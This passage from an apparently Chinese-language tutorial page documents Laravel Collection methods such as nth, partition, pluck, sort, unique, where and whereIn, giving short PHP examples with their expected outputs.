class="line">&#x2F;&#x2F; [&#39;Desk&#39;, &#39;Chair&#39;, &#39;Bookcase&#39;, &#39;Door&#39;]</span><br></pre></td></tr></table></figure><h2 id="min"><a href="#min" class="headerlink" title="min"></a>min</h2><p>返回指定键的最小值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$min = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;min();     <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h2 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h2><p>返回指定键的众数值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>])-&gt;mode();    <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><h2 id="nth"><a href="#nth" class="headerlink" title="nth"></a>nth</h2><p>每隔n个元素取一个元素组成一个新的集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>]);</span><br><span class="line">$collection-&gt;nth(<span class="number">4</span>);    <span class="comment">// ['a', 'e']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个参数可以作为偏移位置 </span></span><br><span class="line">$collection-&gt;nth(<span class="number">4</span>, <span class="number">1</span>); <span class="comment">// ['b', 'f']</span></span><br></pre></td></tr></table></figure><h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><p>返回集合中给定键的所有项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>, <span class="string">'discount'</span> =&gt; <span class="keyword">false</span>]);</span><br><span class="line">$filtered = $collection-&gt;only([<span class="string">'product_id'</span>, <span class="string">'name'</span>]);</span><br><span class="line">$filtered-&gt;all();     <span class="comment">// ['product_id' =&gt; 1, 'name' =&gt; 'Desk']</span></span><br></pre></td></tr></table></figure><h2 id="partition"><a href="#partition" class="headerlink" title="partition"></a>partition</h2><p>配合list()方法区分回调函数满足和不满足的数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($underThree, $equalOrAboveThree) = $collection-&gt;partition(<span class="function"><span class="keyword">function</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $i &lt; <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$underThree-&gt;all();     <span class="comment">// [1, 2]</span></span><br><span class="line">$equalOrAboveThree-&gt;all();    <span class="comment">// [3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure><h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><p>将集合传给给定的回调并返回结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection &#x3D; collect([1, 2, 3]);</span><br><span class="line">$piped &#x3D; $collection-&gt;pipe(function ($collection) &#123;</span><br><span class="line">    return $collection-&gt;sum();</span><br><span class="line">&#125;); &#x2F;&#x2F; 6</span><br></pre></td></tr></table></figure><h2 id="pluck"><a href="#pluck" class="headerlink" title="pluck"></a>pluck</h2><p>获取集合中给定键对应的所有值。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-100'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">"id"</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-200'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">"id"</span> =&gt; <span class="number">2</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$plucked = $collection-&gt;pluck(<span class="string">'name'</span>);</span><br><span class="line">$plucked-&gt;all();    <span class="comment">// ['Desk', 'Chair']</span></span><br></pre></td></tr></table></figure><p>还可以传入第二个参数作为键值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$plucked &#x3D; $collection-&gt;pluck(&#39;name&#39;, &quot;id&quot;);</span><br><span class="line">$plucked-&gt;all();    &#x2F;&#x2F; [1 &#x3D;&gt; &#39;Desk&#39;, 2 &#x3D;&gt; &#39;Chair&#39;]</span><br></pre></td></tr></table></figure><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>移除并返回集合中的最后一个项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;pop();     <span class="comment">// 5</span></span><br><span class="line">$collection-&gt;all();     <span class="comment">// [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure><h2 id="prepend"><a href="#prepend" class="headerlink" title="prepend"></a>prepend</h2><p>将给定的值添加到集合的开头。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;prepend(<span class="number">99</span>);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// [99, 1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><p>如果是关联数组，也可以传入第二个参数作为键值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'one'</span> =&gt; <span class="number">1</span>, <span class="string">'two'</span> =&gt; <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;prepend(<span class="number">0</span>, <span class="string">'zero'</span>);</span><br><span class="line">$collection-&gt;all();       <span class="comment">// ['zero' =&gt; 0, 'one' =&gt; 1, 'two' =&gt; 2]</span></span><br></pre></td></tr></table></figure><h2 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h2><p>把给定键对应的值从集合中移除并返回。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="string">'prod-100'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;pull(<span class="string">'name'</span>);    <span class="comment">// 'Desk'</span></span><br><span class="line">$collection-&gt;all();           <span class="comment">// ['product_id' =&gt; 'prod-100']</span></span><br></pre></td></tr></table></figure><h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>把给定值添加到集合的末尾。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;push(<span class="number">5</span>);</span><br><span class="line">$collection-&gt;all();       <span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h2 id="put"><a href="#put" class="headerlink" title="put"></a>put</h2><p>在集合内设置给定的键值对。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;put(<span class="string">'price'</span>, <span class="number">100</span>);</span><br><span class="line">$collection-&gt;all();       <span class="comment">// ['product_id' =&gt; 1, 'name' =&gt; 'Desk', 'price' =&gt; 100]</span></span><br></pre></td></tr></table></figure><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>从集合中返回一个随机项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">$collection-&gt;random();      <span class="comment">// 4 - (retrieved randomly)</span></span><br></pre></td></tr></table></figure><p>也可以传入一个整数用来指定需要需要获取的随机项个数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;random();    <span class="comment">// 2, 3, 5</span></span><br></pre></td></tr></table></figure><h2 id="reject"><a href="#reject" class="headerlink" title="reject"></a>reject</h2><p>使用指定的回调过滤集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;reject(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$filtered-&gt;all();     <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>倒转集合中项目的顺序，并保留原始的键值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>]);</span><br><span class="line"></span><br><span class="line">$reversed = $collection-&gt;reverse();</span><br><span class="line">$reversed-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        4 =&gt; 'e',</span></span><br><span class="line"><span class="comment">        3 =&gt; 'd',</span></span><br><span class="line"><span class="comment">        2 =&gt; 'c',</span></span><br><span class="line"><span class="comment">        1 =&gt; 'b',</span></span><br><span class="line"><span class="comment">        0 =&gt; 'a',</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>搜索给定的值并返回它的键，如果没有找到返回 false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;search(<span class="number">4</span>);   <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h2 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h2><p>移除并返回集合的第一个元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;shift();   <span class="comment">// 1</span></span><br><span class="line">$collection-&gt;all();     <span class="comment">// [2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h2 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h2><p>随机排序集合中的项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$shuffled = $collection-&gt;shuffle();</span><br><span class="line">$shuffled-&gt;all();       <span class="comment">// [3, 2, 5, 1, 4] - (generated randomly)</span></span><br></pre></td></tr></table></figure><h2 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h2><p>返回集合中给定值后面的部分。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]);</span><br><span class="line"></span><br><span class="line">$slice = $collection-&gt;slice(<span class="number">4</span>);</span><br><span class="line">$slice-&gt;all();      <span class="comment">// [5, 6, 7, 8, 9, 10]</span></span><br></pre></td></tr></table></figure><p>与<code>skip()</code> 方法类似。</p><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>保留原数组的键，对集合进行排序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">$sorted = $collection-&gt;sort();</span><br><span class="line"><span class="comment">// 重置索引</span></span><br><span class="line">$sorted-&gt;values()-&gt;all();       <span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h2 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h2><p>删除并返回从给定值后的内容，原集合也会受到影响。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$chunk = $collection-&gt;splice(<span class="number">2</span>);</span><br><span class="line">$chunk-&gt;all();            <span class="comment">// [3, 4, 5]</span></span><br><span class="line">$collection-&gt;all();       <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><p>将集合按给定的值拆分。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$groups = $collection-&gt;split(<span class="number">3</span>);</span><br><span class="line">$groups-&gt;all();     <span class="comment">// [[1, 2], [3, 4], [5]]</span></span><br></pre></td></tr></table></figure><h2 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h2><p>返回集合内所有项目的总和。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;sum();    <span class="comment">// 15</span></span><br></pre></td></tr></table></figure><h2 id="take"><a href="#take" class="headerlink" title="take"></a>take</h2><p>返回给定数量项目的新集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$chunk = $collection-&gt;take(<span class="number">3</span>);</span><br><span class="line">$chunk-&gt;all();      <span class="comment">// [0, 1, 2]</span></span><br></pre></td></tr></table></figure><h2 id="times"><a href="#times" class="headerlink" title="times"></a>times</h2><p>静态<code>times()</code> 方法通过调用给定次数的回调函数来创建新集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = Collection::times(<span class="number">10</span>, <span class="function"><span class="keyword">function</span> <span class="params">($number)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $number * <span class="number">9</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// [9, 18, 27, 36, 45, 54, 63, 72, 81, 90]</span></span><br></pre></td></tr></table></figure><h2 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h2><p>迭代集合并对集合内的每个项目调用给定的回调。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$multiplied = $collection-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $item * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$multiplied-&gt;all();     <span class="comment">// [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><p>注意：each 只是遍历集合，map 则会返回一个新的集合实例；它不会修改原集合。如果你想修改原集合，请使用 transform 方法。</p><h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p>将给定的数组添加到集合中。如果给定的数组含有与原集合一样的键，则首选原始集合的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span> =&gt; [<span class="string">'a'</span>], <span class="number">2</span> =&gt; [<span class="string">'b'</span>]]);</span><br><span class="line"></span><br><span class="line">$union = $collection-&gt;union([<span class="number">3</span> =&gt; [<span class="string">'c'</span>], <span class="number">1</span> =&gt; [<span class="string">'b'</span>]]);</span><br><span class="line">$union-&gt;all();      <span class="comment">// [1 =&gt; ['a'], 2 =&gt; ['b'], 3 =&gt; ['c']]</span></span><br></pre></td></tr></table></figure><h2 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h2><p>返回集合中所有唯一的项目。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$unique = $collection-&gt;unique();</span><br><span class="line"><span class="comment">// 使用value 重置索引</span></span><br><span class="line">$unique-&gt;values()-&gt;all();     <span class="comment">// [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure><p>当处理嵌套数组或对象时，你可以指定用于确定唯一性的键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'iPhone 6'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>, <span class="string">'type'</span> =&gt; <span class="string">'phone'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'iPhone 5'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>, <span class="string">'type'</span> =&gt; <span class="string">'phone'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Apple Watch'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>, <span class="string">'type'</span> =&gt; <span class="string">'watch'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Galaxy S6'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Samsung'</span>, <span class="string">'type'</span> =&gt; <span class="string">'phone'</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Galaxy Gear'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Samsung'</span>, <span class="string">'type'</span> =&gt; <span class="string">'watch'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$unique = $collection-&gt;unique(<span class="string">'brand'</span>);</span><br><span class="line">$unique-&gt;values()-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'],</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="values"><a href="#values" class="headerlink" title="values"></a>values</h2><p>返回键被重置为连续编号的新集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]);</span><br><span class="line">$sorted-&gt;values()-&gt;all();   <span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h2 id="when"><a href="#when" class="headerlink" title="when"></a>when</h2><p>当传入的第一个参数为 true 的时，将执行给定的回调。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;when(<span class="keyword">true</span>, <span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="number">4</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当传入的第一个参数不为 true 的时候，将执行给定的回调函数</span></span><br><span class="line">$collection-&gt;unless(<span class="keyword">false</span>, <span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="number">5</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="where"><a href="#where" class="headerlink" title="where"></a>where</h2><p>通过给定的键值过滤集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'price'</span> =&gt; <span class="number">150</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Door'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;where(<span class="string">'price'</span>, <span class="number">100</span>);</span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Chair', 'price' =&gt; 100],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Door', 'price' =&gt; 100],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><code>whereStrict</code>方法使用严格模式通过给定的键值过滤集合。</p><h2 id="whenEmpty"><a href="#whenEmpty" class="headerlink" title="whenEmpty"></a>whenEmpty</h2><p>当集合为空时，将执行给定的回调函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'michael'</span>, <span class="string">'tom'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;whenEmpty(<span class="function"><span class="keyword">function</span> <span class="params">($collection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $collection-&gt;push(<span class="string">'adam'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// ['michael', 'tom']</span></span><br></pre></td></tr></table></figure><p>反之<code>whenNotEmpty()</code> 方法当集合不为空时，将执行给定的回调函数。</p><h2 id="whereIn"><a href="#whereIn" class="headerlink" title="whereIn"></a>whereIn</h2><p>通过给定的键值数组来过滤集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'price'</span> =&gt; <span class="number">150</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Door'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;whereIn(<span class="string">'price'</span>, [<span class="number">150</span>, <span class="number">200</span>]);</span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Desk', 'price' =&gt; 200],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Bookcase', 'price' =&gt; 